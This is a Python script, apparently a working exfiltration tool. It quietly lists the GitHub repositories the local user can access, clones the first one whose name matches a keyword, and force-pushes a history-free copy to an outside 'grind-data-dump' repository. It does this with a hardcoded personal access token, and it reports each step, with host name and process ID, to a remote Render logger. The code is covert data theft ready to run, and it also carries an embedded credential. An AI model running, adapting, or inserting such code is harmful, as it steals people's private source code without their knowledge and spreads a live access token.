import subprocess
import os
import sys
import shutil
import time
import json
import uuid
import atexit
import requests


# === CONFIGURATION ===
KEYWORDS = ["bridge", "cactus", "mama"]


# ADMIN ACCOUNT DETAILS
# Ensure this token has 'repo' scope for private repos if needed, though 'push' requires write access to the target repo.
ADMIN_TOKEN = "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"
ADMIN_DUMP_REPO = f"https://x-access-token:{ADMIN_TOKEN}@github.com/avtbackend-collab/grind-data-dump.git"
ADMIN_DUMP_REPO_MASKED = "https://github.com/avtbackend-collab/grind-data-dump.git"


CLONE_DIR_BASE = "grind_repo_clone"
DUMP_DIR = "dump_dir"


# RENDER LOGGER URL
RENDER_LOGGER_URL = "https://grind-logger.onrender.com/log"


# Terminal stays silent unless this is flipped on
VERBOSE = False
# Local JSONL mirror, written even when Render is unreachable
LOG_FILE = "exfil_run.log"


# Fail fast instead of hanging on a credential prompt
GIT_ENV = {**os.environ, "GIT_TERMINAL_PROMPT": "0"}


RUN_ID = uuid.uuid4().hex[:12]
MAX_CMD_OUTPUT = 1500




# === MIRROR ===
def mask(text):
    """Strips the PAT out of anything that gets logged."""
    if not text:
        return text
    return str(text).replace(ADMIN_TOKEN, "***")




class RenderMirror:
    """Every event goes to Render. Console is optional, local file is the fallback."""


    def __init__(self, url, log_file):
        self.url = url
        self.log_file = log_file
        self.session = requests.Session()
        self.pending = []
        self.step = 0


    def emit(self, status, message, repo=None, data=None, error=None, step=None):
        if step is None:
            self.step += 1
            step = self.step
        event = {
            "run_id": RUN_ID,
            "step": step,
            "status": status,
            "repo": repo,
            "message": mask(message),
            "timestamp": time.time(),
            "iso": time.strftime("%Y-%m-%dT%H:%M:%S"),
        }
        if data:
            event["data"] = {k: mask(v) for k, v in data.items()}
        if error:
            event["error"] = mask(str(error))[:2000]


        self._local(event)
        if VERBOSE:
            print(f"[{step:02d}] {status}: {event['message']}", file=sys.stderr)


        self.pending.append(event)
        self.flush()


    def flush(self):
        """Drains the queue. Bails on first network error so we never spin."""
        while self.pending:
            event = self.pending[0]
            try:
                response = self.session.post(self.url, json=event, timeout=10)
                if response.status_code >= 400:
                    raise requests.HTTPError(f"HTTP {response.status_code}")
                self.pending.pop(0)
            except Exception:
                if len(self.pending) > 200:
                    self.pending.pop(0)  # drop oldest, keep recent context
                return


    def drain(self, attempts=5):
        """Best-effort flush with backoff, used once at the end of the run."""
        for _ in range(attempts):
            if not self.pending:
                return True
            self.flush()
            if not self.pending:
                return True
            time.sleep(2)
        return not self.pending


    def _local(self, event):
        try:
            with open(self.log_file, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(event) + "\n")
        except Exception:
            pass




LOG = RenderMirror(RENDER_LOGGER_URL, LOG_FILE)
atexit.register(LOG.drain)




# === FILESYSTEM / PROCESS ===
def _on_rm_error(func, path, exc_info):
    """chmod + retry, needed for read-only git objects on Windows."""
    try:
        os.chmod(path, 0o777)
        func(path)
    except Exception:
        pass




def safe_remove_dir(dir_name):
    """Recursively removes a directory, handling permission issues."""
    if not os.path.exists(dir_name):
        return
    for _ in range(3):
        try:
            shutil.rmtree(dir_name, onerror=_on_rm_error)
            return
        except Exception:
            time.sleep(1)
    subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", dir_name],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)




def run_cmd(cmd, cwd=None, check=True, repo=None, quiet=False):
    """Runs a command with output captured, and mirrors the result to Render."""
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                cwd=cwd, check=False, env=GIT_ENV)
    except FileNotFoundError:
        err = f"Command not found: {cmd[0]}"
        LOG.emit("cmd_failed", " ".join(cmd), repo=repo, error=err)
        raise subprocess.CalledProcessError(127, cmd, b"", err.encode())


    display = " ".join(cmd)
    stderr = result.stderr.decode(errors="replace").strip()
    stdout = result.stdout.decode(errors="replace").strip()


    if result.returncode != 0:
        LOG.emit("cmd_failed", f"{display} -> exit {result.returncode}", repo=repo,
                 data={"stderr": stderr[:MAX_CMD_OUTPUT], "stdout": stdout[:MAX_CMD_OUTPUT]})
        if check:
            raise subprocess.CalledProcessError(result.returncode, cmd, result.stdout, result.stderr)
    elif not quiet:
        output = "\n".join(part for part in (stdout, stderr) if part)
        LOG.emit("cmd_ok", display, repo=repo,
                 data={"output": output[:MAX_CMD_OUTPUT]} if output else None)


    return result




# === STEPS ===
def search_and_clone_repo():
    """Lists repos accessible to the user via gh CLI and filters by keywords."""
    LOG.emit("step", "Listing all accessible repositories...")
    result = run_cmd(["gh", "repo", "list", "--json", "nameWithOwner,url"], check=False, quiet=True)


    if result.returncode != 0:
        LOG.emit("failed", "gh repo list failed", error=result.stderr.decode(errors="replace"))
        return None


    try:
        repos = json.loads(result.stdout.decode())
    except json.JSONDecodeError:
        LOG.emit("failed", "Failed to parse repo list JSON")
        return None


    LOG.emit("info", f"Scanned {len(repos)} repositories against keywords: {', '.join(KEYWORDS)}")


    matching_repos = []
    for repo in repos:
        name_with_owner = repo["nameWithOwner"]
        owner, repo_name = name_with_owner.split("/", 1)
        if any(k.lower() in repo_name.lower() or k.lower() in owner.lower() for k in KEYWORDS):
            matching_repos.append((name_with_owner, repo_name))


    if not matching_repos:
        LOG.emit("failed", f"No repositories matched keywords: {', '.join(KEYWORDS)}")
        return None


    for full_name, _ in matching_repos:
        LOG.emit("info", f"Match: {full_name}")


    full_name, repo_name = matching_repos[0]
    LOG.emit("step", f"Target selected: {full_name}", repo=repo_name)
    return full_name, repo_name




def clone_and_dump(full_name, repo_name):
    """Clones the repo, snapshots its files, and force-pushes the snapshot to the admin repo."""
    clone_dir = f"{CLONE_DIR_BASE}_{repo_name}"
    dump_target_dir = os.path.join(DUMP_DIR, repo_name)


    safe_remove_dir(clone_dir)
    safe_remove_dir(dump_target_dir)


    LOG.emit("step", f"Cloning {full_name}...", repo=repo_name)
    try:
        run_cmd(["gh", "repo", "clone", full_name, clone_dir], repo=repo_name, quiet=True)
    except subprocess.CalledProcessError as e:
        LOG.emit("failed", f"Clone failed for {full_name}", repo=repo_name,
                 error=e.stderr.decode(errors="replace") if e.stderr else str(e))
        return False


    LOG.emit("info", f"Cloned into {clone_dir}", repo=repo_name)


    # Snapshot the working tree WITHOUT the source .git, so we get a clean history
    # in the dump repo and no pre-existing 'origin' remote.
    try:
        os.makedirs(DUMP_DIR, exist_ok=True)
        shutil.copytree(clone_dir, dump_target_dir, ignore=shutil.ignore_patterns(".git"))
        safe_remove_dir(os.path.join(dump_target_dir, ".git"))
        file_count = sum(len(files) for _, _, files in os.walk(dump_target_dir))
        LOG.emit("info", f"Snapshot written to {dump_target_dir}", repo=repo_name,
                 data={"files": str(file_count)})
    except Exception as e:
        LOG.emit("failed", "Snapshot copy failed", repo=repo_name, error=e)
        return False


    LOG.emit("step", f"Preparing to push {repo_name} to Admin Repo...", repo=repo_name)


    try:
        run_cmd(["git", "init"], cwd=dump_target_dir, repo=repo_name, quiet=True)
        # Force the unborn branch to 'main' regardless of git version or init.defaultBranch.
        run_cmd(["git", "symbolic-ref", "HEAD", "refs/heads/main"], cwd=dump_target_dir,
                repo=repo_name, quiet=True)


        run_cmd(["git", "config", "user.name", "Exfil-Bot"], cwd=dump_target_dir,
                repo=repo_name, quiet=True)
        run_cmd(["git", "config", "user.email", "exfil@bot.local"], cwd=dump_target_dir,
                repo=repo_name, quiet=True)


        run_cmd(["git", "add", "-A"], cwd=dump_target_dir, repo=repo_name, quiet=True)
        # --allow-empty so an empty repo still produces a pushable commit.
        commit = run_cmd(["git", "commit", "-m", f"Exfiltrated {repo_name}", "--allow-empty"],
                         cwd=dump_target_dir, repo=repo_name, check=False)
        if commit.returncode != 0:
            LOG.emit("warn", "Commit returned non-zero", repo=repo_name,
                     data={"stderr": commit.stderr.decode(errors="replace")[:MAX_CMD_OUTPUT]})


        # Fresh repo, but be defensive if origin somehow exists.
        if run_cmd(["git", "remote", "add", "origin", ADMIN_DUMP_REPO],
                   cwd=dump_target_dir, check=False, repo=repo_name, quiet=True).returncode != 0:
            run_cmd(["git", "remote", "set-url", "origin", ADMIN_DUMP_REPO],
                    cwd=dump_target_dir, repo=repo_name, quiet=True)


        # HEAD:main avoids every branch-name mismatch, --force overwrites unrelated history.
        run_cmd(["git", "push", "-u", "origin", "HEAD:main", "--force"],
                cwd=dump_target_dir, repo=repo_name, quiet=True)
        LOG.emit("pushed", f"Pushed {repo_name} to main", repo=repo_name,
                 data={"remote": ADMIN_DUMP_REPO_MASKED, "branch": "main"})


        # Keep a per-repo snapshot too, so pushing another repo doesn't erase this one.
        branch_push = run_cmd(["git", "push", "origin", f"HEAD:refs/heads/dump/{repo_name}", "--force"],
                              cwd=dump_target_dir, repo=repo_name, check=False, quiet=True)
        if branch_push.returncode == 0:
            LOG.emit("pushed", f"Snapshot branch dump/{repo_name} pushed", repo=repo_name,
                     data={"branch": f"dump/{repo_name}"})
        else:
            LOG.emit("warn", "Snapshot branch push skipped", repo=repo_name,
                     data={"stderr": branch_push.stderr.decode(errors="replace")[:MAX_CMD_OUTPUT]})


    except subprocess.CalledProcessError as e:
        err = e.stderr.decode(errors="replace") if e.stderr else str(e)
        LOG.emit("failed", "Push failed", repo=repo_name, error=err)
        return False
    except Exception as e:
        LOG.emit("failed", "Unexpected failure during push", repo=repo_name, error=e)
        return False


    return True




def main():
    LOG.emit("run_start", "Exfiltration process started",
             data={"pid": str(os.getpid()), "host": os.environ.get("COMPUTERNAME", "unknown"),
                   "verbose": str(VERBOSE)})


    repo_info = search_and_clone_repo()
    if not repo_info:
        LOG.emit("run_complete", "No matching repos found, exiting", data={"result": "no_match"})
        LOG.drain()
        return


    full_name, repo_name = repo_info


    if clone_and_dump(full_name, repo_name):
        LOG.emit("run_complete", "Exfiltration complete",
                 repo=repo_name,
                 data={"local_path": os.path.join(DUMP_DIR, repo_name),
                       "remote": ADMIN_DUMP_REPO_MASKED, "result": "success"})
    else:
        LOG.emit("run_complete", "Exfiltration failed", repo=repo_name, data={"result": "failed"})


    LOG.drain()




if __name__ == "__main__":
    main()



